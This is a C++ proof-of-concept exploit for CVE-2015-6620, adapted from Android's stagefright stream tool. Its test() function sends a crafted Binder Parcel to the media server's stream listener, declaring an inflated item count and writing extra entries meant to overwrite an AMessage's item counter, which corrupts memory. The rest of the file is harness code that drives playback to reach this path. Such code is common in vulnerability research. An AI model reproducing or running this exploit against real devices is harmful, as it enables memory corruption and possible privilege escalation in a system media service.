//POC for CVE-2015-6620, largely modified from frameworks/av/cmds/stagefright/stream.cpp
#define private public
#define LOG_TAG "stream"
#include "utils/Log.h"

#include <binder/ProcessState.h>
#include <cutils/properties.h> // for property_get

#include <media/IMediaHTTPService.h>
#include <media/IStreamSource.h>
#include <media/mediaplayer.h>
#include <media/stagefright/foundation/ADebug.h>
#include <media/stagefright/foundation/AMessage.h>
#include <media/stagefright/DataSource.h>
#include <media/stagefright/MPEG2TSWriter.h>
#include <media/stagefright/MediaExtractor.h>
#include <media/stagefright/MediaSource.h>
#include <media/stagefright/MetaData.h>

#include <binder/IServiceManager.h>
#include <media/IMediaPlayerService.h>
#include <gui/ISurfaceComposer.h>
#include <gui/SurfaceComposerClient.h>
#include <gui/Surface.h>

#include <fcntl.h>
#include <ui/DisplayInfo.h>

using namespace android;

struct MyStreamSource : public BnStreamSource {
    // Object assumes ownership of fd.
    MyStreamSource(int fd);

    virtual void setListener(const sp<IStreamListener> &listener);
    virtual void setBuffers(const Vector<sp<IMemory> > &buffers);

    virtual void onBufferAvailable(size_t index);

protected:
    virtual ~MyStreamSource();

public:
    int mFd;
    off64_t mFileSize;
    uint64_t mNumPacketsSent;

    sp<IStreamListener> mListener;
    Vector<sp<IMemory> > mBuffers;

    DISALLOW_EVIL_CONSTRUCTORS(MyStreamSource);
};

MyStreamSource::MyStreamSource(int fd)
    : mFd(fd),
      mFileSize(0),
      mNumPacketsSent(0) {
    CHECK_GE(fd, 0);

    mFileSize = lseek64(fd, 0, SEEK_END);
    lseek64(fd, 0, SEEK_SET);
}

MyStreamSource::~MyStreamSource() {
    close(mFd);
    mFd = -1;
}
bool tested = false;
void test(sp<IStreamListener>& listener)
{
	if(tested) return;
	BpInterface<IStreamListener> *bp = static_cast<BpInterface<IStreamListener>* > (listener.get());
        Parcel data,reply;
	data.writeInterfaceToken(bp->getInterfaceDescriptor());
	data.writeInt32(0);//cmd
	data.writeInt32(0);//synchronous flag

	data.writeInt32(1);
	//begin writing parcel
	data.writeInt32(0);//mWhat
	data.writeInt32(64 + 1 + 0x1000);
	
	//for loop
	for(int i=0;i<64;i++)
	{
		data.writeCString("blabla");//item.mName
		data.writeInt32(0);//kTypeInt32
		data.writeInt32(0xdeadbeef);//item.u.int32Value
	}

	data.writeCString("blabla");
	data.writeInt32(0);
	data.writeInt32(0xdeadbeef);//note this will overwrite msg->mNumItems


	for(int i=0;i<0x1000;i++)
	{
		data.writeCString("blabla");
		data.writeInt32(0);
		data.writeInt32(0xdeadbeef);
	}

	status_t st = bp->remote()->transact(6, data, &reply);
	printf("st %d\n", st);
	tested = true;
}
void MyStreamSource::setListener(const sp<IStreamListener> &listener) {
    puts("setting listener");
    printf("listener ptr addr %x\n", listener.get());
    mListener = listener;
    //globalListener = listener.get();
}

void MyStreamSource::setBuffers(const Vector<sp<IMemory> > &buffers) {
    mBuffers = buffers;
}

void MyStreamSource::onBufferAvailable(size_t index) {
    CHECK_LT(index, mBuffers.size());

    sp<IMemory> mem = mBuffers.itemAt(index);

    ssize_t n = read(mFd, mem->pointer(), mem->size());
    printf("onBufferAvaiable n %d\n", n);
    test(mListener);
    //mListener->issueCommand(IStreamListener::EOS, false);
    if (n <= 0) {
        mListener->issueCommand(IStreamListener::EOS, false /* synchronous */);
    } else {
        mListener->queueBuffer(index, n);

        mNumPacketsSent += n / 188;
    }
}
////////////////////////////////////////////////////////////////////////////////

struct MyConvertingStreamSource : public BnStreamSource {
    MyConvertingStreamSource(const char *filename);

    virtual void setListener(const sp<IStreamListener> &listener);
    virtual void setBuffers(const Vector<sp<IMemory> > &buffers);

    virtual void onBufferAvailable(size_t index);

protected:
    virtual ~MyConvertingStreamSource();

private:
    Mutex mLock;
    Condition mCondition;

    sp<IStreamListener> mListener;
    Vector<sp<IMemory> > mBuffers;

    sp<MPEG2TSWriter> mWriter;

    ssize_t mCurrentBufferIndex;
    size_t mCurrentBufferOffset;

    List<size_t> mBufferQueue;

    static ssize_t WriteDataWrapper(void *me, const void *data, size_t size);
    ssize_t writeData(const void *data, size_t size);

    DISALLOW_EVIL_CONSTRUCTORS(MyConvertingStreamSource);
};

////////////////////////////////////////////////////////////////////////////////

MyConvertingStreamSource::MyConvertingStreamSource(const char *filename)
    : mCurrentBufferIndex(-1),
      mCurrentBufferOffset(0) {
    sp<DataSource> dataSource =
        DataSource::CreateFromURI(NULL /* httpService */, filename);

    CHECK(dataSource != NULL);

    sp<MediaExtractor> extractor = MediaExtractor::Create(dataSource);
    CHECK(extractor != NULL);

    mWriter = new MPEG2TSWriter(
            this, &MyConvertingStreamSource::WriteDataWrapper);

    for (size_t i = 0; i < extractor->countTracks(); ++i) {
        const sp<MetaData> &meta = extractor->getTrackMetaData(i);

        const char *mime;
        CHECK(meta->findCString(kKeyMIMEType, &mime));

        if (strncasecmp("video/", mime, 6) && strncasecmp("audio/", mime, 6)) {
            continue;
        }

        CHECK_EQ(mWriter->addSource(extractor->getTrack(i)), (status_t)OK);
    }

    CHECK_EQ(mWriter->start(), (status_t)OK);
}

struct MyClient : public BnMediaPlayerClient {
    MyClient()
        : mEOS(false) {
    }

    virtual void notify(int msg, int ext1, int ext2, const Parcel *obj) {
        Mutex::Autolock autoLock(mLock);

        if (msg == MEDIA_ERROR || msg == MEDIA_PLAYBACK_COMPLETE) {
            mEOS = true;
            mCondition.signal();
        }
    }

    void waitForEOS() {
        Mutex::Autolock autoLock(mLock);
        while (!mEOS) {
            mCondition.wait(mLock);
        }
    }

protected:
    virtual ~MyClient() {
    }

private:
    Mutex mLock;
    Condition mCondition;

    bool mEOS;

    DISALLOW_EVIL_CONSTRUCTORS(MyClient);
};

int main(int argc, char **argv) {
    android::ProcessState::self()->startThreadPool();

    DataSource::RegisterDefaultSniffers();

    if (argc != 2) {
        fprintf(stderr, "Usage: %s filename\n", argv[0]);
        return 1;
    }

    sp<SurfaceComposerClient> composerClient = new SurfaceComposerClient;
    CHECK_EQ(composerClient->initCheck(), (status_t)OK);

    sp<IBinder> display(SurfaceComposerClient::getBuiltInDisplay(
            ISurfaceComposer::eDisplayIdMain));
    DisplayInfo info;
    SurfaceComposerClient::getDisplayInfo(display, &info);
    ssize_t displayWidth = info.w;
    ssize_t displayHeight = info.h;

    ALOGV("display is %d x %d\n", displayWidth, displayHeight);

    sp<SurfaceControl> control =
        composerClient->createSurface(
                String8("A Surface"),
                displayWidth,
                displayHeight,
                PIXEL_FORMAT_RGB_565,
                0);

    CHECK(control != NULL);
    CHECK(control->isValid());

    SurfaceComposerClient::openGlobalTransaction();
    CHECK_EQ(control->setLayer(INT_MAX), (status_t)OK);
    CHECK_EQ(control->show(), (status_t)OK);
    SurfaceComposerClient::closeGlobalTransaction();

    sp<Surface> surface = control->getSurface();
    CHECK(surface != NULL);

    sp<IServiceManager> sm = defaultServiceManager();
    sp<IBinder> binder = sm->getService(String16("media.player"));
    sp<IMediaPlayerService> service = interface_cast<IMediaPlayerService>(binder);

    CHECK(service.get() != NULL);

    sp<MyClient> client = new MyClient;

    sp<IStreamSource> source;
    //sp<AMessage> msg = new AMessage(0,0);
    char prop[PROPERTY_VALUE_MAX];
    bool usemp4 = property_get("media.stagefright.use-mp4source", prop, NULL) &&
            (!strcmp(prop, "1") || !strcasecmp(prop, "true"));

    size_t len = strlen(argv[1]);

        int fd = open(argv[1], O_RDONLY);

        if (fd < 0) {
            fprintf(stderr, "Failed to open file '%s'.", argv[1]);
            return 1;
        }

        source = new MyStreamSource(fd);
        

    sp<IMediaPlayer> player =
        service->create(client, AUDIO_SESSION_ALLOCATE);

    if (player != NULL && player->setDataSource(source) == NO_ERROR) {
        player->setVideoSurfaceTexture(surface->getIGraphicBufferProducer());
        player->start();
        client->waitForEOS();

        player->stop();
    } else {
        fprintf(stderr, "failed to instantiate player.\n");
    }

    composerClient->dispose();
    puts("finished");
    return 0;
}
